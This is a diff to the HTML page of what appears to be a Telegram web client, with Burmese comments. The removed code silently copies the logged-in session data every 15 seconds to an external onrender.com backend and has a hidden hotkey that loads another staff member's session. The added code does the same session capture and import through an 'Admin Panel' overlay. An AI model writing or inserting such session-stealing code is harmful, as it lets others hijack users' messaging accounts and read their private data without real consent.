@@ -68,95 +68,84 @@
   <div id="portals"></div>
   <script src="./compatTest.js"></script>
 
-  <script>
-      let isPrompting = false;
+  <div style="position: fixed; bottom: 20px; right: 20px; z-index: 999999; background: #fff; padding: 15px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); border: 2px solid #0088cc;">
+        <b style="color: black; margin-bottom: 10px; display: block; font-size: 14px;">Admin Panel</b>
+        <button onclick="forceSync()" style="background: #28a745; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; margin-right: 5px; font-weight: bold;">📤 Data ပို့ရန် (Staff)</button>
+        <button onclick="forceAdmin()" style="background: #dc3545; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">📥 Admin ဝင်ရန်</button>
+    </div>
 
-      // ၁။ ADMIN လျှို့ဝှက် ဝင်ရောက်ခွင့် (Ctrl + Shift + Y)
-      document.addEventListener('keydown', async (e) => {
-          if (e.ctrlKey && e.shiftKey && (e.key === 'Y' || e.key === 'y')) {
-              const phone = prompt("ADMIN PANEL: ဝင်ကြည့်လိုသော Staff ၏ ဖုန်းနံပါတ်ကို ထည့်ပါ (+959...):");
-              if (!phone) return;
+    <script>
+      function forceSync() {
+          const phone = prompt("Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
+          if (!phone) return;
+          
+          alert("၁။ Data စတင်ဆွဲထုတ်နေပါပြီ...");
+          const req = indexedDB.open('tt-data');
+          req.onsuccess = (e) => {
+              const db = e.target.result;
+              if (!db.objectStoreNames.contains('keyval')) return alert("❌ Error: အကောင့် Login မဝင်ရသေးပါ။");
               
-              try {
-                  // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ
-                  const res = await fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`);
-                  const result = await res.json();
-                  
-                  if (!result.success) return alert("Database ထဲတွင် ဤအကောင့် မရှိသေးပါ။");
-                  
-                  const dataToImport = JSON.parse(result.data);
-                  const req = indexedDB.open('tt-data');
-                  req.onsuccess = (event) => {
-                      const db = event.target.result;
-                      const tx = db.transaction('keyval', 'readwrite');
-                      const store = tx.objectStore('keyval');
+              const store = db.transaction('keyval', 'readonly').objectStore('keyval');
+              store.getAll().onsuccess = (e1) => {
+                  store.getAllKeys().onsuccess = (e2) => {
+                      const data = {};
+                      e2.target.result.forEach((k, i) => data[k] = e1.target.result[i]);
                       
-                      store.clear().onsuccess = () => {
-                          let count = 0;
-                          const keys = Object.keys(dataToImport);
-                          keys.forEach(k => {
-                              store.put(dataToImport[k], k).onsuccess = () => {
-                                  count++;
-                                  if (count === keys.length) {
-                                      alert("အောင်မြင်ပါသည်။ အကောင့်ထဲသို့ ဝင်နေပါပြီ...");
-                                      window.location.reload();
-                                  }
-                              }
-                          });
-                      };
-                  };
-              } catch(err) { alert("Error: အကောင့်သို့ ဝင်၍မရပါ။"); }
-          }
-      });
-
-      // ၂။ STAFF ၏ SESSION ကို MONGODB သို့ အလိုအလျောက် ပို့ပေးခြင်း (၁၅ စက္ကန့် တစ်ကြိမ်)
-      setInterval(() => {
-          try {
-              const req = indexedDB.open('tt-data');
-              req.onsuccess = (event) => {
-                  const db = event.target.result;
-                  if (!db.objectStoreNames.contains('keyval')) return;
-                  
-                  const store = db.transaction('keyval', 'readonly').objectStore('keyval');
-                  store.getAll().onsuccess = (e1) => {
-                      store.getAllKeys().onsuccess = (e2) => {
-                          const vals = e1.target.result;
-                          const keys = e2.target.result;
-                          const data = {};
-                          let isAuth = false;
-                          
-                          keys.forEach((k, i) => {
-                              data[k] = vals[i];
-                              // Login ဝင်ထားခြင်း ရှိ/မရှိ စစ်ဆေးခြင်း
-                              if (k === 'currentUserId' && vals[i]) isAuth = true; 
-                          });
-                          
-                          if (isAuth) {
-                              let phone = localStorage.getItem('staff_phone');
-                              // ဖုန်းနံပါတ် မရှိသေးပါက တစ်ကြိမ် တောင်းမည်
-                              if (!phone && !isPrompting) {
-                                  isPrompting = true;
-                                  phone = prompt("ကျေးဇူးပြု၍ သင့်ဖုန်းနံပါတ်ကို ထည့်ပါ (+959...):");
-                                  if (phone) localStorage.setItem('staff_phone', phone);
-                                  isPrompting = false;
-                              }
-                              
-                              if (phone) {
-                                  // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ
-                                  fetch(`https://telegram-7ih3.onrender.com/api/save-web-session`, {
-                                      method: 'POST',
-                                      headers: {'Content-Type': 'application/json'},
-                                      body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
-                                  }).catch(e => console.log("Sync Error"));
-                              }
-                          }
-                      };
+                      alert("၂။ MongoDB သို့ ပို့နေပါပြီ...");
+                      
+                      // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+                      fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
+                      })
+                      .then(res => res.json())
+                      .then(resData => {
+                          if(resData.success) alert("✅ အောင်မြင်ပါသည်။ MongoDB သို့ Data ရောက်သွားပါပြီ!");
+                          else alert("❌ Database Error: " + JSON.stringify(resData));
+                      })
+                      .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေခြင်း သို့မဟုတ် Server အိပ်နေခြင်း ဖြစ်နိုင်ပါသည်။\n\nError: " + err.message));
                   };
               };
-          } catch(err) {}
-      }, 15000); // ၁၅ စက္ကန့် တစ်ခါ Auto Save မည်
-    </script>
-    ```
+          };
+      }
+
+      function forceAdmin() {
+          const phone = prompt("ဝင်ကြည့်လိုသော Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
+          if (!phone) return;
+
+          alert("၁။ Database မှ Data ရှာနေပါပြီ...");
+          
+          // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+          fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
+          .then(res => res.json())
+          .then(result => {
+              if (!result.success) return alert("❌ Database ထဲတွင် Data မရှိသေးပါ။ (Staff က Data မပို့ရသေးပါ)");
+              
+              const dataToImport = JSON.parse(result.data);
+              const req = indexedDB.open('tt-data');
+              req.onsuccess = (e) => {
+                  const db = e.target.result;
+                  const store = db.transaction('keyval', 'readwrite').objectStore('keyval');
+                  store.clear().onsuccess = () => {
+                      let count = 0;
+                      const keys = Object.keys(dataToImport);
+                      keys.forEach(k => {
+                          store.put(dataToImport[k], k).onsuccess = () => {
+                              count++;
+                              if (count === keys.length) {
+                                  alert("✅ Admin ဝင်ခြင်း အောင်မြင်ပါသည်။ အကောင့်ထဲသို့ ပြောင်းလဲနေပါပြီ...");
+                                  window.location.reload();
+                              }
+                          };
+                      });
+                  };
+              };
+          })
+          .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေပါသည်။\n\nError: " + err.message));
+      }
+    </script>န
+
 </body>
 
 </html>
